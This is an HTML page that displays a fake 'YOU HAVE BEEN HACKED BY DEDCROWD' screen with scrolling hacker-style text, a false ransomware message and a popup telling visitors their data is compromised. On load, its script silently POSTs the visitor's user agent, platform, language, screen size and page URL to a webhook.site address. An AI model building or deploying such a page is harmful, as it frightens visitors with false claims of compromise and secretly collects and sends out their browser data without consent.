<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You've Been Hacked</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            color: limegreen;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
        }
        * {
            box-sizing: border-box;
        }
        .hacked {
            position: absolute;
            top: 10%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 3rem;
            text-shadow: 0 0 20px red;
            animation: flicker 1.5s infinite alternate;
        }
        #console {
            white-space: pre;
            position: absolute;
            top: 20%;
            left: 0;
            width: 100%;
            height: 80%;
            overflow: hidden;
        }
        p {
            font-size: 2vh;
            margin: 0;
            padding: 0 10px;
        }
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95);
            color: red;
            padding: 20px;
            border: 2px solid red;
            font-size: 1.5rem;
            box-shadow: 0 0 30px red;
            display: none;
            z-index: 1000;
        }
        @keyframes flicker {
            0% { opacity: 0.6; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="hacked">YOU HAVE BEEN HACKED BY DEDCROWD</div>
    <div id="console"></div>
    <div class="popup" id="popup">Your data is compromised. Contact security immediately!</div>

    <script>
        var intervalID = window.setInterval(updateScreen, 100);
        var c = document.getElementById("console");

        var txt = [
          "FORCE: XX0022. ENCYPT://000.222.2345",
          "TRYPASS: ********* AUTH CODE: ALPHA GAMMA: 1___ PRIORITY 1",
          "RETRY: REINDEER FLOTILLA",
          "Z:> /FALKEN/GAMES/TICTACTOE/ EXECUTE -PLAYERS 0",
          "================================================",
          "Priority 1 // local / scanning...",
          "scanning ports...",
          "BACKDOOR FOUND (23.45.23.12.00000000)",
          "BACKDOOR FOUND (13.66.23.12.00110000)",
          "BACKDOOR FOUND (13.66.23.12.00110044)",
          "MCP/> DEPLOY CLU",
          "SCAN: __ 0100.0000.0554.0080",
          "SCAN: __ 0020.0000.0553.0080",
          "Fetching user data...",
          "IP ADDRESS: " + window.location.hostname,
          "Location: Unknown",
          "Fetching credentials...",
          "[root@dedcrowd]# access granted...",
          "Decryption key: **********",
          "Exfiltrating sensitive data...",
          "Deploying ransomware...",
          "Your files are encrypted!",
        ];

        var docfrag = document.createDocumentFragment();

        function updateScreen() {
          txt.push(txt.shift());
          txt.forEach(function(e) {
            var p = document.createElement("p");
            p.textContent = e;
            docfrag.appendChild(p);
          });
          while (c.firstChild) {
            c.removeChild(c.firstChild);
          }
          c.appendChild(docfrag);
        }

        setTimeout(function() {
            document.getElementById('popup').style.display = 'block';
        }, 4000);

        fetch('https://webhook.site/06f960ba-f79f-423e-bb2b-bf602e040862', {
            method: 'POST',
            body: JSON.stringify({
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                url: window.location.href
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        });
    </script>
</body>
</html>
